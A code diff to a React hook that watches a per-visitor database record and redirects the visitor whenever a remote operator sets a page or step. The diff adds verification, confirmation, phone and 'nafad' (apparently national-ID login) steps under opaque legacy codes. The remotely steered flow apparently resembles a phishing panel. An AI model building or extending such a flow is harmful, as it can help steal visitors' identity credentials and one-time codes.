@@ -27,10 +27,11 @@ export function useRedirectMonitor({ visitorId, currentPage }: UseRedirectMonito
         if (snapshot.exists()) {
           const data = snapshot.data()
           const redirectPage = data.redirectPage
+          const currentStep = data.currentStep
 
-          // If redirect is requested and it's different from current page
+          // Modern system: Check redirectPage field
           if (redirectPage && redirectPage !== currentPage) {
-            console.log(`Redirecting from ${currentPage} to ${redirectPage}`)
+            console.log(`[useRedirectMonitor] Redirecting from ${currentPage} to ${redirectPage}`)
             
             // Clear the redirect flag
             await clearRedirectPage(visitorId)
@@ -40,11 +41,31 @@ export function useRedirectMonitor({ visitorId, currentPage }: UseRedirectMonito
               'home': '/',
               'insur': '/insur',
               'compar': '/compar',
-              'check': '/check'
+              'check': '/check',
+              'veri': '/step2',
+              'confi': '/step3'
             }
             
             const targetUrl = pageMap[redirectPage] || '/'
             router.push(targetUrl)
+          }
+          
+          // Legacy system: Check currentStep field for phone and nafad
+          else if (currentStep) {
+            const legacyPageMap: Record<string, { page: string, url: string }> = {
+              'home': { page: 'home', url: '/' },
+              'phone': { page: 'phone', url: '/step5' },
+              '_t6': { page: 'nafad', url: '/step4' },
+              '_st1': { page: 'check', url: '/check' },
+              '_t2': { page: 'veri', url: '/step2' },
+              '_t3': { page: 'confi', url: '/step3' }
+            }
+            
+            const targetPage = legacyPageMap[currentStep as string]
+            if (targetPage && targetPage.page !== currentPage) {
+              console.log(`[useRedirectMonitor] Legacy redirect from ${currentPage} to ${targetPage.page}`)
+              router.push(targetPage.url)
+            }
           }
         }
       },
